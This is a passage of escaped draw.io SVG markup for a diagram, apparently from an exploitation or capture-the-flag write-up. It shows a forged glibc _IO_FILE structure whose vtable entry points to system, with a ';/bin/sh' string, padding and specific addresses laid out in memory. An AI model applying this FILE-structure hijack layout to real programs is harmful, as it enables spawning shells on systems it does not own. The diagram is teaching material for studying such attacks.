pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-349-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;369.25&quot;&gt;char* _IO_buf_end;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 384.8 L 349 384.8&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-389-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;409.35&quot;&gt;char *_IO_save_base; &lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 424.9 L 349 424.9&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-429-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;449.45&quot;&gt;char *_IO_backup_base;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 465 L 349 465&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-469-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;489.55&quot;&gt;char *_IO_save_end;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 505.1 L 349 505.1&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-509-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;529.65&quot;&gt;struct _IO_marker *_markers;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 545.2 L 349 545.2&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-549-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;569.75&quot;&gt;struct _IO_FILE *_chain;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 585.3 L 349 585.3&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-589-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;609.85&quot;&gt;int _fileno;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 625.4 L 349 625.4&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-629-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;649.95&quot;&gt;int _flags2;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 665.5 L 349 665.5&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-670-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;690.05&quot;&gt;_IO_off_t _old_offset;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 705.6 L 349 705.6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-710-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;730.15&quot;&gt;... columns&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 745.7 L 349 745.7&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-750-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;770.25&quot;&gt;_IO_lock_t *_lock;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 0 26 L 0 0 L 160 0 L 160 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 0 26 L 0 821.5 L 160 821.5 L 160 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 0 26 L 160 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-weight=&quot;bold&quot; text-anchor=&quot;middle&quot; font-size=&quot;10.999999999999998px&quot;&gt;&lt;text x=&quot;79.5&quot; y=&quot;17&quot;&gt;_IO_FILE_plus&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-4-26-152-751-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;79.5&quot; y=&quot;406.25&quot;&gt;_IO_FILE file;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 0 781.5 L 160 781.5&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-4-785-152-36-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;5.5&quot; y=&quot;808&quot;&gt;struct _IO_jump_t *vtable;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 612.5 13.77 L 612.5 25.84&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 655 13.77 L 655 25.84&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 697.5 25.84 L 697.5 13.77&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 740 25.84 L 740 13.77&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 570 25.84 L 570 13.77&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)scale(0.9999999999999999)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;101%&quot; height=&quot;101%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 591px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap; &quot;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;591&quot; y=&quot;15&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;1&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;g transform=&quot;translate(-0.5 -0.5)scale(0.9999999999999999)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;101%&quot; height=&quot;101%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 633px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap; &quot;&gt;2&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;633&quot; y=&quot;15&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;2&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;g transform=&quot;translate(-0.5 -0.5)scale(0.9999999999999999)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;101%&quot; height=&quot;101%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 676px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap; &quot;&gt;3&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;676&quot; y=&quot;15&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;3&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;g transform=&quot;translate(-0.5 -0.5)scale(0.9999999999999999)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;101%&quot; height=&quot;101%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 718px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap; &quot;&gt;4&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;718&quot; y=&quot;15&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;4&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;570&quot; y=&quot;24.84&quot; width=&quot;170&quot; height=&quot;840.16&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-746-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;10.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;770.31&quot;&gt;0x804b0a0 (filename+32)&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 786.2 L 740 786.2&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-785-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;809.55&quot;&gt;0x804b2a8 (name+72)&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 824.94 L 740 824.94&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-820-162-44-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;848.16&quot;&gt;&amp;amp;system&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-27-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;53.35&quot;&gt;0xFFFFDFFF&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 67.74 L 740 67.74&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-106-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;131.91&quot;&gt;n&#x2F;sh&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 146.31 L 740 146.31&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-186-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;211.93&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 226.32 L 740 226.32&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-226-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;251.94&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 266.33 L 740 266.33&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-266-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;291.95&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 306.34 L 740 306.34&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-306-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;331.95&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 346.35 L 740 346.35&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-386-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;411.97&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 426.36 L 740 426.36&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-426-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;451.98&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 466.37 L 740 466.37&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-466-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;491.98&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 506.38 L 740 506.38&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-506-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;531.99&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 546.39 L 740 546.39&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-546-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;572&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 586.39 L 740 586.39&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-586-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;612.01&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 626.4 L 740 626.4&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-626-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;652.02&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 666.41 L 740 666.41&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-666-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;692.02&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 706.42 L 740 706.42&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-706-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;732.03&quot;&gt;AAAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 746.42 L 740 746.42&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 740 805.05 L 770.05 805 L 770.05 765.84 L 740.05 765.84 L 742.24 765.99&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 748.1 762.46 L 741.12 765.99 L 748.14 769.46&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 770 26 L 742.24 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 748.12 22.5 L 741.12 26 L 748.12 29.5&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)scale(0.9999999999999999)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;101%&quot; height=&quot;101%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 1px; height: 1px; padding-top: 26px; margin-left: 772px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 14px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap; &quot;&gt;&lt;font face=&quot;Courier New&quot; style=&quot;font-size: 14px&quot;&gt;name (0x804b260)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;772&quot; y=&quot;30&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;14px&quot;&gt;name (0x804b260)&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 349 47.95 L 510.05 47.95 L 567.76 47.85&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; stroke-dasharray=&quot;2.9999999999999996 2.9999999999999996&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 561.89 51.36 L 568.88 47.85 L 561.88 44.36&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-66-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;91.89&quot;&gt;;&#x2F;bi&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 106.28 L 740 106.28&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; clip-path=&quot;url(#mx-clip-574-146-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;171.89&quot;&gt;;AAA&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 186.28 L 740 186.28&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 767.92 370.04 L 770.05 370.05 L 742.24 369.32&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 748.21 365.98 L 741.12 369.29 L 748.02 372.97&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)scale(0.9999999999999999)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;101%&quot; height=&quot;101%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 1px; height: 1px; padding-top: 368px; margin-left: 772px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 14px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap; &quot;&gt;&lt;div style=&quot;text-align: right ; font-size: 14px&quot;&gt;&lt;span style=&quot;font-family: &amp;quot;courier new&amp;quot; ; font-size: 14px&quot;&gt;fp (0x804b280&lt;&#x2F;span&gt;&lt;span style=&quot;font-family: &amp;quot;courier new&amp;quot; ; font-size: 14px&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;772&quot; y=&quot;372&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;14px&quot;&gt;fp (0x804b280)&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Courier New&quot; 